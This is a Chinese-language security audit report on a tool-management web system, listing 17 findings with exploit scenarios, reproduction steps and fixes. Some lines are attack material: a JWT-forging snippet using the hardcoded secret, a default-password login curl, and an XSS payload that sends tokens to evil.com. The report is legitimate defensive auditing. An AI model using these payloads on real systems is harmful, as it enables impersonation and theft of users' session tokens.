# 工器具管理系统 — 上线前安全审计报告

## Meta
- **审计模式**: Comprehensive（全量深度审计）
- **日期**: 2026-05-10
- **范围**: 后端 server.js (1166行), 前端 API层/认证/路由/Vite配置, 数据库文件, 依赖链
- **执行阶段**: 14/14（全量）
- **审计员**: GStack CSO

---

## Executive Summary

该系统存在 **2个严重(Critical)、7个重大(Major)、5个中等(Minor)、3个信息(Info)** 级别安全发现。最关键的问题是 **JWT密钥硬编码**（可伪造任意身份）和 **默认密码123456**（与无速率限制组合可被暴力破解）。JSON文件数据库的并发写入无锁保护，在生产环境将导致数据丢失。系统整体安全评级为 **D**，不建议在当前状态下上线，需至少修复所有 Critical 和 Major 级别问题后方可部署。

---

## Findings

---

### [F-001] JWT 密钥硬编码 — 可伪造任意身份令牌
- **Category**: OWASP A02 / STRIDE: Spoofing
- **Severity**: 🔴 Critical
- **Confidence**: 10/10
- **Location**: `backend/server.js:11`
- **Description**: JWT 签名密钥以明文硬编码 `'your-secret-key-change-in-production'`，且从未被替换为环境变量或安全配置。任何获得源码访问权限的人（包括内网用户、代码仓库访问者）均可使用该密钥签发任意 role 的 JWT token。
- **Exploit Scenario**:
  1. 攻击者获取 JWT_SECRET 值 `your-secret-key-change-in-production`
  2. 使用 `jwt.sign({ user_id: 1, username: 'admin', role: 'admin' }, 'your-secret-key-change-in-production')` 伪造管理员 token
  3. 携带伪造 token 访问所有 requireAdmin 保护的管理端点
  4. 执行用户管理、角色管理、订单审批等全部管理员操作
- **Reproduction Steps**:
  ```javascript
  const jwt = require('jsonwebtoken');
  const token = jwt.sign(
    { user_id: 1, username: 'attacker', role: 'admin' },
    'your-secret-key-change-in-production',
    { expiresIn: '7d' }
  );
  // 使用此 token 请求 GET /api/users — 返回全部用户列表
  ```
- **Remediation**:
  1. 将 JWT_SECRET 移入环境变量：`const JWT_SECRET = process.env.JWT_SECRET;`
  2. 启动时校验密钥存在且长度 >= 32 字符：`if (!JWT_SECRET || JWT_SECRET.length < 32) process.exit(1);`
  3. 使用强随机密钥：`openssl rand -hex 32`
- **Priority**: P0（上线前必须修复）

---

### [F-002] 默认密码 '123456' + 无暴力破解防护
- **Category**: OWASP A05/A07 / STRIDE: Spoofing + Elevation of Privilege
- **Severity**: 🔴 Critical
- **Confidence**: 10/10
- **Location**: `backend/server.js:29`, `server.js:42`, `server.js:257`, `server.js:316`
- **Description**:
  1. 系统初始化时所有用户默认密码为 `123456`（第29、42行）
  2. 创建用户时默认密码为 `123456`（第257行 `password = '123456'`）
  3. 重置密码时默认新密码为 `123456`（第316行 `new_password = '123456'`）
  4. 登录端点无速率限制、无账户锁定机制
  5. 密码策略仅要求最小6位，无复杂度要求
  组合效果：攻击者可在无任何防护的情况下对已知用户名执行暴力破解，且默认密码极弱。
- **Exploit Scenario**:
  1. 攻击者尝试 `admin:123456` 直接登录成功（默认密码未修改的情况）
  2. 或使用工具对登录端点进行字典攻击，每秒可尝试数千次
  3. 获得管理员权限后控制整个系统
- **Reproduction Steps**:
  ```
  curl -X POST http://target:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"123456"}'
  # 返回 access_token 和管理员用户信息
  ```
- **Remediation**:
  1. 首次部署强制修改默认密码
  2. 密码策略：最小8位，包含大小写字母+数字+特殊字符
  3. 添加登录速率限制（如 express-rate-limit：5次/分钟/IP）
  4. 添加账户锁定：连续5次失败锁定15分钟
  5. 重置密码生成随机临时密码，而非固定默认值
- **Priority**: P0（上线前必须修复）

---

### [F-003] CORS 完全开放 — 跨域请求无限制
- **Category**: OWASP A05 / STRIDE: Tampering + Information Disclosure
- **Severity**: 🟠 Major
- **Confidence**: 10/10
- **Location**: `backend/server.js:14`
- **Description**: `app.use(cors())` 未配置任何限制，允许任意来源的跨域请求。攻击者可从恶意网站发起跨域请求，利用已登录用户的 token 执行操作（配合 localStorage 中 token 的读取）。
- **Exploit Scenario**:
  1. 用户在浏览器中同时打开了恶意网站和工器具管理系统
  2. 恶意网站通过 XSS 读取 localStorage 中的 token
  3. 或恶意网站直接发起跨域请求（CORS 允许），如果用户点击诱导链接
- **Reproduction Steps**:
  ```
  curl -H "Origin: https://evil.com" -I http://target:3000/api/users \
    -H "Authorization: Bearer <token>"
  # 响应头包含 Access-Control-Allow-Origin: https://evil.com
  ```
- **Remediation**:
  ```javascript
  app.use(cors({
    origin: process.env.CORS_ORIGIN || 'http://localhost:3100',
    credentials: true
  }));
  ```
- **Priority**: P1

---

### [F-004] JSON 文件数据库并发写入无锁保护 — 数据丢失/损坏
- **Category**: OWASP A08 / STRIDE: Tampering + Denial of Service
- **Severity**: 🟠 Major
- **Confidence**: 9/10
- **Location**: `backend/server.js:121-129`
- **Description**:
  1. `readDB()` 和 `writeDB()` 使用同步文件操作，无任何锁机制
  2. 两个并发请求可能读同一版本数据，各自修改后写入，后者覆盖前者变更（TOCTOU竞态）
  3. `writeFileSync` 非原子操作，进程崩溃可导致 JSON 文件损坏
  4. 同步 I/O 阻塞 Node.js 事件循环，影响所有请求处理
- **Exploit Scenario**:
  1. 管理员 A 创建新用户，同时管理员 B 创建工具
  2. 两个请求同时读取 db.json（版本 N）
  3. A 写入包含新用户的 db.json（版本 N+1）
  4. B 写入包含新工具但不包含 A 的新用户的 db.json（覆盖版本 N+1 为 N+1'）
  5. 管理员 A 创建的用户数据丢失
- **Reproduction Steps**:
  ```bash
  # 并发发送两个创建请求
  curl -X POST http://target:3000/api/users -H "Authorization: Bearer <admin-token>" -H "Content-Type: application/json" -d '{"username":"userA"}' &
  curl -X POST http://target:3000/api/users -H "Authorization: Bearer <admin-token>" -H "Content-Type: application/json" -d '{"username":"userB"}' &
  # 检查 db.json，可能只包含 userA 或 userB 之一
  ```
- **Remediation**:
  1. 引入文件锁（如 `proper-lockfile` 包）保护读写操作
  2. 使用原子写入：先写入临时文件，再 rename 覆盖
  3. 改用异步 I/O + 队列化写入
  4. 长期：迁移到 SQLite 或真正的数据库
- **Priority**: P1

---

### [F-005] 认证中间件不检查用户是否被禁用 — 禁用用户 Token 仍有效
- **Category**: OWASP A01 / STRIDE: Spoofing + Elevation of Privilege
- **Severity**: 🟠 Major
- **Confidence**: 9/10
- **Location**: `backend/server.js:132-144`
- **Description**: `authenticate` 中间件仅验证 JWT 签名和过期时间，不检查用户当前状态。管理员禁用用户后（`is_active = false`），该用户已签发的 JWT 在 7 天过期前仍然有效，可继续访问所有 API。
- **Exploit Scenario**:
  1. 用户获得合法 JWT token
  2. 管理员发现异常，将该用户 `is_active` 设为 `false`
  3. 用户的 token 仍然有效，继续操作系统
  4. 即使修改密码，旧 token 也不失效
- **Reproduction Steps**:
  1. 以 user1 身份登录获取 token
  2. 管理员将 user1 的 is_active 设为 false
  3. 使用 user1 的 token 请求 `GET /api/dashboard` — 仍返回 200 成功
- **Remediation**:
  1. 在 authenticate 中间件中增加用户状态校验：
     ```javascript
     const user = db.users.find(u => u.user_id === decoded.user_id);
     if (!user || !user.is_active) return res.status(401).json({ message: '用户已被禁用' });
     ```
  2. 实现 Token 黑名单/版本号机制，密码修改或禁用时失效旧 token
  3. 缩短 token 有效期，配合 refresh token 机制
- **Priority**: P1

---

### [F-006] JWT Token 存储在 localStorage — XSS 可窃取
- **Category**: OWASP A07 / STRIDE: Information Disclosure
- **Severity**: 🟠 Major
- **Confidence**: 9/10
- **Location**: `vue-frontend/src/store/auth.ts:14`, `vue-frontend/src/api/index.ts:10-13`
- **Description**: JWT token 存储在 `localStorage` 中，JavaScript 可通过 `localStorage.getItem('token')` 直接读取。如果页面存在任何 XSS 漏洞，攻击者可窃取 token 冒充用户身份。`localStorage` 不会随 HTTP 请求自动发送，但可被 XSS 脚本读取。
- **Exploit Scenario**:
  1. 系统存在存储型 XSS（如工具描述字段未转义）
  2. 攻击者在工具描述中注入 `<script>fetch('https://evil.com/steal?token='+localStorage.getItem('token'))</script>`
  3. 管理员查看工具列表时，token 被发送到攻击者服务器
- **Reproduction Steps**:
  ```javascript
  // 在浏览器控制台执行
  const token = localStorage.getItem('token');
  // token 值可被任何同源 JS 代码读取
  ```
- **Remediation**:
  1. 改用 HttpOnly + Secure + SameSite=Strict Cookie 存储 token
  2. 后端设置 `Set-Cookie` 响应头，而非在响应体中返回 token
  3. 前端移除 localStorage 的 token 存储
- **Priority**: P1

---

### [F-007] 无安全响应头 — 多种客户端攻击无防护
- **Category**: OWASP A05 / STRIDE: Information Disclosure + Tampering
- **Severity**: 🟠 Major
- **Confidence**: 10/10
- **Location**: `backend/server.js`（全局缺失）
- **Description**: 服务器未设置任何安全响应头，包括但不限于：
  - `Content-Security-Policy`：无 CSP，允许任意内联脚本执行（XSS 放大器）
  - `X-Frame-Options` / `frame-ancestors`：可被 iframe 嵌入（Clickjacking）
  - `X-Content-Type-Options`：浏览器可能 MIME 嗅探
  - `Strict-Transport-Security`：无 HSTS
  - `X-XSS-Protection`：旧浏览器 XSS 过滤未启用
- **Reproduction Steps**:
  ```
  curl -I http://target:3000/api/auth/me -H "Authorization: Bearer <token>"
  # 响应头中无 Content-Security-Policy, X-Frame-Options 等安全头
  ```
- **Remediation**:
  ```javascript
  const helmet = require('helmet');
  app.use(helmet());
  ```
  或手动设置：
  ```javascript
  app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    next();
  });
  ```
- **Priority**: P1

---

### [F-008] 无请求体大小限制 — 内存耗尽 DoS
- **Category**: OWASP A04 / STRIDE: Denial of Service
- **Severity**: 🟠 Major
- **Confidence**: 9/10
- **Location**: `backend/server.js:15-16`
- **Description**: `bodyParser.json()` 和 `bodyParser.urlencoded()` 未设置 `limit` 选项，默认限制为 100kb（body-parser v2），但未显式配置。攻击者可发送超大请求体消耗服务器内存。同时 `extended: true` 允许 qs 库解析嵌套对象，可能导致原型污染或高 CPU 消耗。
- **Exploit Scenario**:
  1. 攻击者发送数 MB 的 JSON 请求体
  2. body-parser 解析消耗大量内存和 CPU
  3. 服务器事件循环阻塞，正常请求超时
- **Reproduction Steps**:
  ```bash
  # 生成大 JSON 并发送
  python3 -c "import json; print(json.dumps({'data': 'A' * 10000000}))" | \
    curl -X POST http://target:3000/api/auth/login \
    -H "Content-Type: application/json" -d @-
  ```
- **Remediation**:
  ```javascript
  app.use(bodyParser.json({ limit: '10kb' }));
  app.use(bodyParser.urlencoded({ extended: false, limit: '10kb' }));
  ```
- **Priority**: P1

---

### [F-009] db.json 含密码哈希并纳入版本控制
- **Category**: OWASP A02 / STRIDE: Information Disclosure
- **Severity**: 🟠 Major
- **Confidence**: 8/10
- **Location**: `backend/db.json`, `.gitignore`
- **Description**: 数据库文件 `db.json` 包含 bcrypt 密码哈希，且 `.gitignore` 未排除该文件。如果代码仓库公开或被泄露，所有用户密码哈希暴露。虽然 bcrypt 提供一定保护，但弱密码（如默认的 123456）可被快速破解。
- **Reproduction Steps**:
  ```
  # 查看 .gitignore — 未包含 db.json 或 backend/db.json
  # db.json 在 git 中可被追踪和访问
  ```
- **Remediation**:
  1. 将 `db.json` 和 `backend/db.json` 添加到 `.gitignore`
  2. 从 git 历史中移除已提交的 db.json：`git filter-branch --force --index-filter 'git rm --cached backend/db.json'`
  3. 考虑将敏感数据与代码分离
- **Priority**: P1

---

### [F-010] Math.max 展开运算符栈溢出 — 数据量 DoS
- **Category**: OWASP A04 / STRIDE: Denial of Service
- **Severity**: 🟡 Minor
- **Confidence**: 8/10
- **Location**: `backend/server.js:266,370,436,508,599,699,781,872,984`
- **Description**: 多处使用 `Math.max(...array.map())` 模式生成自增 ID。JavaScript 函数调用栈限制约 65536-262144 个参数。当任一数据集合增长超过此限制时，服务器将抛出 `RangeError: Maximum call stack size exceeded` 崩溃。
- **Exploit Scenario**:
  1. 管理员批量创建 100000+ 个工具
  2. 下次创建时 `Math.max(...db.tools.map(t => t.tool_id))` 栈溢出
  3. 服务器返回 500 错误，该资源类型无法再创建
- **Reproduction Steps**:
  ```javascript
  // 在 Node.js 中
  Math.max(...Array(200000).fill(0).map((_, i) => i));
  // RangeError: Maximum call stack size exceeded
  ```
- **Remediation**:
  ```javascript
  // 替换为 reduce
  const maxId = db.tools.reduce((max, t) => Math.max(max, t.tool_id), 0);
  ```
- **Priority**: P2

---

### [F-011] 前端路由守卫不检查角色 — 仅依赖 API 鉴权
- **Category**: OWASP A01 / STRIDE: Information Disclosure
- **Severity**: 🟡 Minor
- **Confidence**: 8/10
- **Location**: `vue-frontend/src/router/index.ts:30-38`
- **Description**: 路由守卫 `beforeEach` 仅检查 token 是否存在，不验证用户角色。普通用户可直接在浏览器输入 `/users`、`/roles` 等管理页面 URL 访问前端组件。虽然 API 会拒绝请求，但前端页面结构、表单、字段名等 UI 信息已暴露给普通用户。
- **Reproduction Steps**:
  1. 以 staff 用户登录
  2. 在浏览器地址栏输入 `http://localhost:3100/users`
  3. 用户管理页面正常渲染（API 请求会 403，但页面布局和组件可见）
- **Remediation**:
  ```typescript
  router.beforeEach((to, from, next) => {
    const token = localStorage.getItem('token')
    const userRole = localStorage.getItem('role') // 或从 store 读取
    const adminRoutes = ['/users', '/roles', '/depts']

    if (!token && to.path !== '/login') {
      next('/login')
    } else if (adminRoutes.includes(to.path) && userRole !== 'admin') {
      next('/dashboard')
    } else {
      next()
    }
  })
  ```
- **Priority**: P2

---

### [F-012] 订单列表按 real_name 过滤 — 潜在越权查看
- **Category**: OWASP A01 / STRIDE: Information Disclosure
- **Severity**: 🟡 Minor
- **Confidence**: 7/10
- **Location**: `backend/server.js:932`
- **Description**: 普通用户获取订单列表时，使用 `borrower_name === user.real_name` 过滤。如果两个用户 real_name 相同，他们会看到彼此的订单。应使用 `borrower_id` 过滤。
- **Reproduction Steps**:
  1. 创建两个 real_name 相同的用户
  2. 用户 A 创建订单
  3. 用户 B 查看订单列表，能看到用户 A 的订单
- **Remediation**:
  ```javascript
  return res.json(orders.filter(o => o.borrower_id === req.user.user_id));
  ```
- **Priority**: P2

---

### [F-013] 无任何审计日志 — 操作不可追溯
- **Category**: OWASP A09 / STRIDE: Repudiation
- **Severity**: 🟡 Minor
- **Confidence**: 10/10
- **Location**: `backend/server.js`（全局缺失）
- **Description**: 系统未记录任何安全相关操作日志，包括：登录成功/失败、密码修改、用户创建/删除/禁用、角色变更、订单审批、数据删除。所有操作不可追溯，无法满足审计合规要求。
- **Remediation**:
  1. 引入 Winston/Pino 日志库
  2. 记录所有安全事件：谁(user_id)、何时(timestamp)、做了什么(action)、对什么资源(resource_id)、结果(result)
  3. 日志输出到文件或外部日志服务
  4. 敏感字段脱敏（不记录密码值）
- **Priority**: P2

---

### [F-014] 无 CSRF 防护 — 跨站请求伪造
- **Category**: OWASP A04 / STRIDE: Tampering
- **Severity**: 🟡 Minor
- **Confidence**: 7/10
- **Location**: `backend/server.js`（全局缺失）
- **Description**: 系统使用 Bearer Token 认证，理论上 CSRF 风险较低（Cookie-based 认证才易受 CSRF 攻击）。但配合 CORS 完全开放和 localStorage 存储 token，如果存在 XSS 漏洞，攻击者仍可构造恶意请求。另外，如果未来改用 Cookie 认证，需同步加入 CSRF Token。
- **Remediation**:
  1. 限制 CORS origin
  2. 如使用 Cookie 认证，添加 CSRF Token（csurf 包）
  3. 设置 SameSite cookie 属性
- **Priority**: P2

---

### [F-015] 密码策略过弱
- **Category**: OWASP A07 / STRIDE: Spoofing
- **Severity**: 🟢 Info
- **Confidence**: 10/10
- **Location**: `backend/server.js:225-227`
- **Description**: 修改密码仅校验 `new_password.length < 6`，无复杂度要求（大小写、数字、特殊字符）。用户可以将密码改为 `aaaaaa` 这样的弱密码。
- **Remediation**: 密码策略要求最小 8 位，包含大小写字母 + 数字 + 特殊字符中至少 3 类。
- **Priority**: P3

---

### [F-016] JWT 缺少标准声明
- **Category**: OWASP A07 / STRIDE: Spoofing
- **Severity**: 🟢 Info
- **Confidence**: 8/10
- **Location**: `backend/server.js:170-174`
- **Description**: JWT payload 仅包含 `user_id, username, role`，缺少 `iss`（签发者）、`aud`（受众）、`jti`（唯一标识）等标准声明。缺少 `jti` 使得无法实现 token 黑名单；缺少 `iss/aud` 使得 token 可能被跨服务滥用。
- **Remediation**:
  ```javascript
  jwt.sign({
    user_id: user.user_id,
    username: user.username,
    role: user.role
  }, JWT_SECRET, {
    expiresIn: '7d',
    issuer: 'tool-management-system',
    audience: 'tool-management-client',
    jwtid: crypto.randomUUID()
  });
  ```
- **Priority**: P3

---

### [F-017] 同步文件 I/O 阻塞事件循环
- **Category**: STRIDE: Denial of Service
- **Severity**: 🟢 Info
- **Confidence**: 8/10
- **Location**: `backend/server.js:122-128`
- **Description**: `readDB()` 使用 `fs.readFileSync`，`writeDB()` 使用 `fs.writeFileSync`。每次 API 请求都执行同步文件读写，阻塞 Node.js 事件循环。当 db.json 文件增大时，延迟增加，影响所有并发请求的响应时间。
- **Remediation**:
  1. 短期：将 db 数据缓存到内存，仅在写入时更新文件
  2. 长期：迁移到 SQLite 或其他数据库
- **Priority**: P3

---

## STRIDE 威胁模型汇总

| STRIDE 类别 | 威胁场景 | 关联发现 | 严重度 |
|------------|---------|---------|--------|
| **Spoofing（欺骗）** | JWT 密钥已知，攻击者可伪造任意身份 token | F-001, F-002, F-005, F-015, F-016 | 🔴 |
| **Tampering（篡改）** | 并发写入无锁，数据可被覆盖丢失；CORS 开放允许跨域篡改请求 | F-003, F-004, F-014 | 🟠 |
| **Repudiation（抵赖）** | 无审计日志，所有操作不可追溯 | F-013 | 🟡 |
| **Information Disclosure（信息泄露）** | db.json 含密码哈希被版本控制追踪；localStorage token 可被 XSS 读取；前端管理页面结构对普通用户可见 | F-006, F-007, F-009, F-011, F-012 | 🟠 |
| **Denial of Service（拒绝服务）** | 无速率限制、无请求体大小限制、Math.max 栈溢出、同步 I/O 阻塞 | F-004, F-008, F-010, F-017 | 🟠 |
| **Elevation of Privilege（提权）** | JWT role 信任客户端声明而非服务端验证；默认密码可被暴力破解获取管理员权限 | F-001, F-002, F-005 | 🔴 |

---

## Security Posture Score

| 级别 | 数量 |
|------|------|
| 🔴 Critical | 2 |
| 🟠 Major | 7 |
| 🟡 Minor | 5 |
| 🟢 Info | 3 |
| **总计** | **17** |

**Overall Rating: D**

评级依据：2个 Critical 级别漏洞可直接导致系统被完全接管，且修复成本相对较低（环境变量+密码策略+速率限制）。多个 Major 级别漏洞在组合利用时可造成数据丢失和信息泄露。

---

## Remediation Roadmap

### Sprint 0 — 上线阻断项（P0，必须立即修复）
| # | 发现 | 修复内容 | 预估工时 |
|---|------|---------|---------|
| 1 | F-001 | JWT_SECRET 移入环境变量，强制强随机密钥 | 1h |
| 2 | F-002 | 默认密码机制改为随机生成+强制修改；添加登录速率限制 | 3h |

### Sprint 1 — 高优先级（P1，上线前完成）
| # | 发现 | 修复内容 | 预估工时 |
|---|------|---------|---------|
| 3 | F-003 | CORS 配置限制为前端域名 | 0.5h |
| 4 | F-004 | 文件锁 + 原子写入保护 db.json | 3h |
| 5 | F-005 | authenticate 中间件增加 is_active 校验 | 1h |
| 6 | F-006 | Token 改为 HttpOnly Cookie | 3h |
| 7 | F-007 | 添加 Helmet 安全响应头 | 0.5h |
| 8 | F-008 | 限制请求体大小 | 0.5h |
| 9 | F-009 | db.json 移出版本控制 | 1h |

### Sprint 2 — 中优先级（P2，上线后一周内）
| # | 发现 | 修复内容 | 预估工时 |
|---|------|---------|---------|
| 10 | F-010 | Math.max 展开改为 reduce | 1h |
| 11 | F-011 | 前端路由守卫增加角色检查 | 2h |
| 12 | F-012 | 订单过滤改用 borrower_id | 0.5h |
| 13 | F-013 | 添加审计日志 | 4h |
| 14 | F-014 | 添加 CSRF 防护 | 2h |

### Backlog — 低优先级（P3）
| # | 发现 | 修复内容 |
|---|------|---------|
| 15 | F-015 | 增强密码策略 |
| 16 | F-016 | JWT 添加标准声明 |
| 17 | F-017 | 异步 I/O 或迁移数据库 |

---

## 附录：攻击面清单

| 端点 | 方法 | 认证 | 权限 | 暴露级别 |
|------|------|------|------|---------|
| /api/auth/login | POST | 无 | 公开 | Public |
| /api/auth/me | GET | JWT | 用户 | Internal |
| /api/auth/change-password | POST | JWT | 用户 | Internal |
| /api/dashboard | GET | JWT | 用户 | Internal |
| /api/users | GET | JWT | 管理员 | Admin |
| /api/users | POST | JWT | 管理员 | Admin |
| /api/users/:id | PUT | JWT | 管理员 | Admin |
| /api/users/:id | DELETE | JWT | 管理员 | Admin |
| /api/users/:id/reset-password | POST | JWT | 管理员 | Admin |
| /api/departments | GET | JWT | 用户 | Internal |
| /api/departments | POST | JWT | 管理员 | Admin |
| /api/departments/:id | PUT | JWT | 管理员 | Admin |
| /api/departments/:id | DELETE | JWT | 管理员 | Admin |
| /api/roles | GET | JWT | 用户 | Internal |
| /api/roles | POST | JWT | 管理员 | Admin |
| /api/roles/:id | PUT | JWT | 管理员 | Admin |
| /api/roles/:id | DELETE | JWT | 管理员 | Admin |
| /api/warehouses | GET | JWT | 用户 | Internal |
| /api/warehouses | POST | JWT | 管理员 | Admin |
| /api/warehouses/:id | PUT | JWT | 管理员 | Admin |
| /api/warehouses/:id | DELETE | JWT | 管理员 | Admin |
| /api/shelves | GET | JWT | 用户 | Internal |
| /api/shelves | POST | JWT | 管理员 | Admin |
| /api/shelves/:id | PUT | JWT | 管理员 | Admin |
| /api/shelves/:id | DELETE | JWT | 管理员 | Admin |
| /api/storage-locations | GET | JWT | 用户 | Internal |
| /api/storage-locations | POST | JWT | 管理员 | Admin |
| /api/storage-locations/:id | PUT | JWT | 管理员 | Admin |
| /api/storage-locations/:id | DELETE | JWT | 管理员 | Admin |
| /api/tools | GET | JWT | 用户 | Internal |
| /api/tools | POST | JWT | 管理员 | Admin |
| /api/tools/:id | PUT | JWT | 管理员 | Admin |
| /api/tools/:id | DELETE | JWT | 管理员 | Admin |
| /api/tool-categories | GET | JWT | 用户 | Internal |
| /api/tool-categories | POST | JWT | 管理员 | Admin |
| /api/tool-categories/:id | PUT | JWT | 管理员 | Admin |
| /api/tool-categories/:id | DELETE | JWT | 管理员 | Admin |
| /api/orders | GET | JWT | 用户(自)/管理员(全) | Internal |
| /api/orders | POST | JWT | 用户 | Internal |
| /api/orders/:id/approve | POST | JWT | 管理员 | Admin |
| /api/orders/:id/reject | POST | JWT | 管理员 | Admin |
| /api/orders/:id/return | POST | JWT | 用户(自)/管理员(全) | Internal |
| /api/orders/:id/cancel | POST | JWT | 用户(自)/管理员(全) | Internal |
| /api/orders/:id | DELETE | JWT | 用户(自)/管理员(全) | Internal |
